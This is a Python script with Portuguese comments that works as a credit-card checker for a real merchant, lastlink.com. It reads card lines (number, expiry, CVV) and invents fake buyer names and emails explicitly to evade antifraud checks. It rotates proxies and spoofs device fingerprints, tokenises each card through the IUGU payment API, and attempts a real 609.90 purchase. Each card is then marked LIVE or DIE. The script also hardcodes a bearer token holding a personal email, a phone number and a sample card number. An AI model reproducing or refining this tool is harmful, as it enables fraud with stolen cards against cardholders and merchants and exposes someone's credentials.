import requests
import json
import re
import uuid
import random
import string
import os
import sys
from datetime import datetime, timezone

def gerar_pessoa_aleatoria():
    """Gera dados de identidade sintética para evitar bloqueios de antifraude."""
    first_names = ["CARLOS", "FERNANDO", "LUCAS", "MATHEUS", "JOAO", "PEDRO", "GABRIEL", "RAFAEL", "MARCOS", "BRUNO"]
    last_names = ["SILVA", "SOUZA", "COSTA", "SANTOS", "OLIVEIRA", "PEREIRA", "RODRIGUES", "ALMEIDA", "NASCIMENTO", "LIMA"]
    
    fn = random.choice(first_names)
    ln = random.choice(last_names)
    
    numeros_aleatorios = ''.join(random.choices(string.digits, k=4))
    email = f"{fn.lower()}.{ln.lower()}{numeros_aleatorios}@gmail.com"
    
    return fn, ln, email

def carregar_proxies(nome_ficheiro="proxies.txt"):
    """Lê uma lista de proxies a partir de um ficheiro de texto."""
    if not os.path.exists(nome_ficheiro):
        print(f"[!] Ficheiro '{nome_ficheiro}' não encontrado. O script irá correr com o IP local.")
        return []
    
    with open(nome_ficheiro, 'r') as f:
        # Remove espaços e linhas vazias
        proxies = [linha.strip() for linha in f if linha.strip()]
        
    if not proxies:
        print(f"[!] O ficheiro '{nome_ficheiro}' está vazio. O script irá correr com o IP local.")
        
    return proxies

def run_checkout(linha_cartao, proxy_url=None):
    session = requests.Session()
    
    # Injeção do Proxy na sessão
    if proxy_url:
        try:
            # Limpa espaços e quebras de linha que podem vir da lista
            proxy_url = proxy_url.strip()
            proxy_limpa = proxy_url.replace("http://", "").replace("https://", "")
            partes = proxy_limpa.split(':')
            
            if len(partes) == 4:
                host, porta, user, password = partes
                # Formato correto: http://user:pass@host:port
                proxy_formatada = f"http://{user}:{password}@{host}:{porta}"
            else:
                proxy_formatada = proxy_url if "://" in proxy_url else f"http://{proxy_url}"
            
            # Log de debug para você ver no terminal se a URL ficou certa
            print(f"[DEBUG] Usando Proxy: {host}:{porta}") 

            session.proxies = {
                "http": proxy_formatada,
                "https": proxy_formatada
            }
        except Exception as e:
            print(f"DIE | Erro Proxy | Falha na formatação: {str(e)}")
            return
        
    # Parser do formato "CC|MM|YYYY|CVV"
    try:
        dados_cc = linha_cartao.strip().split('|')
        cc_number = dados_cc[0]
        cc_month = dados_cc[1]
        cc_year = dados_cc[2]
        cc_cvv = dados_cc[3]
    except IndexError:
        print(f"ERROR - {linha_cartao} | Formato inválido. Use CC|MM|YYYY|CVV | HTTP N/A")
        return

    # Gerador de Pessoas
    cc_first_name, cc_last_name, email = gerar_pessoa_aleatoria()
    
    # Geração Dinâmica de Estado e Antifraude
    cookie_session_id = str(uuid.uuid4())
    x_session_id = uuid.uuid4().hex  
    device_fingerprint = uuid.uuid4().hex
    trace_id = str(uuid.uuid4())
    
    session.cookies.set('_llSessionId', cookie_session_id, domain='lastlink.com')
    
    base_headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySWQiOiI1Y2FiNmRiNy1hMmViLTRhODktOGM4Yy1lNmFmYzAyMjA0NTEiLCJUb2tlbiI6IiIsIk5hbWUiOiIiLCJFbWFpbCI6ImhlbnJpcXVlbGVhbHNvdXphNjcxQGdtYWlsLmNvbSIsIkNyZWF0ZWRBdCI6IjA1LzEzLzIwMjUgMTE6NTA6NDQiLCJJc01lbWJlciI6dHJ1ZSwiSXNBZmZpbGlhdGUiOnRydWUsIklzU2FsZXNQYXJ0bmVyIjpmYWxzZSwiSXNDcmVhdG9yIjp0cnVlLCJIYXNBZHVsdENvbnRlbnQiOmZhbHNlLCJTZXNzaW9uSUQiOiI4NDA2YTM0Yy0xNGM4LTQxODgtYjFjNi04MTVmZDU5ZTE2M2IiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaGVucmlxdWVsZWFsc291emE2NzFAZ21haWwuY29tIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvZW1haWxhZGRyZXNzIjoiaGVucmlxdWVsZWFsc291emE2NzFAZ21haWwuY29tIiwiaXNWMiI6dHJ1ZSwiZXhwIjoxNzc1NTk1NTk2fQ.yAxwEVf2aYBGdLNSRbS-BteovfpnICtF-jFSSy7CDGE',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'origin': 'https://lastlink.com',
        'referer': 'https://lastlink.com/p/CF4179BEC/checkout-payment?af=A84621898',
        'x-device-fingerprint': device_fingerprint,
        'x-session-id': x_session_id,
        'x-trace-id': trace_id
    }

    cc_mask = f"{cc_number[:6]}xxxxxx{cc_number[-4:]}|{cc_month}|{cc_year}|{cc_cvv}"
    cc_bin = str(cc_number[:6]) 

    try:
        # ==========================================
        # ETAPA 1: Extrair Token, Timestamp e Affiliado
        # ==========================================
        offer_url = 'https://lastlink.com/api/offer/CF4179BEC?af=A84621898'
        offer_resp = session.get(offer_url, headers=base_headers, timeout=15)
        
        checkout_token = None
        generated_at = None
        affiliate_id = "988a085d-ef0e-4a12-bfc4-0129d7a01904"
        
        if offer_resp.status_code == 200:
            offer_data = offer_resp.json()
            checkout_token = offer_data.get('token')
            generated_at = offer_data.get('generatedAt') 
            affiliate_id = offer_data.get('affiliateId', affiliate_id)
            
        if not checkout_token or not generated_at:
            print(f"ERROR - {cc_mask} | Falha ao capturar token/timestamp da oferta | HTTP {offer_resp.status_code}")
            return

        # ==========================================
        # ETAPA 2: Capturar Estado do Pedido (Hash e Payload)
        # ==========================================
        plans_url = f'https://lastlink.com/api/offer/08da560b-4f31-4fc7-8664-7ce241553901/plans?af=A84621898'
        plans_response = session.get(plans_url, headers=base_headers, timeout=15)
        
        order_hash = None
        order_payload = None
        
        if plans_response.status_code == 200:
            plans_data = plans_response.json()
            for plan in plans_data:
                if plan.get("title") == "3":
                    order_hash = plan["orders"][0]["orderHash"]
                    order_payload = plan["orders"][0]["payload"]
                    break

        if not order_hash or not order_payload:
            print(f"ERROR - {cc_mask} | Falha ao capturar orderHash/payload | HTTP {plans_response.status_code}")
            return

        # ==========================================
        # ETAPA 3: Identificar Lead 
        # ==========================================
        identify_url = f'https://lastlink.com/api/checkout/leads/identify?offerId=08da560b-4f31-4fc7-8664-7ce241553901&email={email}'
        session.get(identify_url, headers=base_headers, timeout=15)

        # ==========================================
        # ETAPA 4: Tokenizar Cartão na IUGU (JSONP)
        # ==========================================
        iugu_url = (
            f"https://api.iugu.com/v1/payment_token?method=credit_card"
            f"&data[number]={cc_number}&data[verification_value]={cc_cvv}"
            f"&data[first_name]={cc_first_name}&data[last_name]={cc_last_name}"
            f"&data[month]={cc_month}&data[year]={cc_year}"
            f"&data[brand]=visa&data[fingerprint]=7702088d-c467-d126-ab10-3ae1771765c7"
            f"&data[version]=2.1&account_id=D8D39FD5E2EC453794C4BF9214B61B0D"
            f"&callback=callback1774991358056"
        )
        
        iugu_headers = {
            'accept': '*/*',
            'referer': 'https://lastlink.com/',
            'user-agent': base_headers['user-agent']
        }
        
        iugu_response = session.get(iugu_url, headers=iugu_headers, timeout=15)
        iugu_token = None
        
        match = re.search(r'callback\d+\((.*)\)', iugu_response.text)
        if match:
            iugu_json = json.loads(match.group(1))
            iugu_token = iugu_json.get("id")
            
        if not iugu_token:
            print(f"ERROR - {cc_mask} | Falha ao tokenizar cartão na IUGU | HTTP {iugu_response.status_code}")
            return

        # ==========================================
        # ETAPA 5: Efetuar Checkout Final
        # ==========================================
        checkout_url = 'https://lastlink.com/api/checkout/payments/credit-card-vnext'
        
        checkout_payload = {
            "subscription": {
                "userEmail": email,
                "affiliateId": affiliate_id,
                "address": {
                    "zipCode": "", "street": "", "streetnumber": "", 
                    "addressComplement": "", "district": "", "city": "", 
                    "state": "", "country": "Brazil"
                },
                "name": f"{cc_first_name} {cc_last_name}",
                "phonenumber": "+5519998585499",
                "document": "",
                "isForeigner": False,
                "itemsQuantity": 1
            },
            "iuguCreditCardToken": iugu_token,
            "checkoutUrl": "https://lastlink.com/p/CF4179BEC/checkout-payment?af=A84621898",
            "affiliateId": affiliate_id,
            "order": {
                "installments": 1,
                "installmentAmount": 609.9,
                "totalAmount": 609.9,
                "payload": order_payload,
                "orderHash": order_hash,
                "version": 1
            },
            "token": checkout_token,      
            "generatedAt": generated_at,  
            "bin": cc_bin
        }

        checkout_response = session.post(checkout_url, headers=base_headers, json=checkout_payload, timeout=20)
        
        # ==========================================
        # ETAPA 6: Normalização do Resultado
        # ==========================================
        status_code = checkout_response.status_code
        
        try:
            resp_json = checkout_response.json()
            
            if isinstance(resp_json, str):
                resp_json = json.loads(resp_json)
                
            purchase_resp = resp_json.get("purchaseResponse", {})
            is_success = purchase_resp.get("success", False)
            
            if is_success:
                print(f"LIVE - {cc_mask} | Pagamento Aprovado | HTTP {status_code}")
            else:
                result_data = purchase_resp.get("result", {})
                motivo = result_data.get("title", "Transação Recusada")
                
                if motivo == "Transação Recusada" and "message" in result_data:
                    motivo = result_data.get("message")
                    
                print(f"DIE - {cc_mask} | {motivo} | HTTP {status_code}")
                
        except (json.JSONDecodeError, ValueError):
            texto_limpo = checkout_response.text[:50].replace('\n', ' ')
            print(f"ERROR - {cc_mask} | Resposta Inesperada / WAF: {texto_limpo}... | HTTP {status_code}")
            
    except requests.exceptions.ProxyError:
        print(f"ERROR - {cc_mask} | Falha na conexão com o Proxy ({proxy_url}) | HTTP N/A")
    except requests.exceptions.Timeout:
        print(f"ERROR - {cc_mask} | Timeout na requisição | HTTP N/A")
    except Exception as e:
        print(f"ERROR - {cc_mask} | Erro Crítico: {str(e)} | HTTP N/A")

if __name__ == "__main__":
    # Verifica se o Node.js enviou argumentos (Cartão e Proxy)
    if len(sys.argv) > 1:
        cartao_da_tela = sys.argv[1]
        # Pega a proxy se ela foi enviada, senão fica None
        proxy_da_tela = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] != "" else None
        
        # Roda o verificador com os dados reais do seu App Cineverse
        run_checkout(cartao_da_tela, proxy_url=proxy_da_tela)
    else:
        # Caso você rode o script manualmente para teste rápido
        run_checkout("4563310048475663|10|2029|000")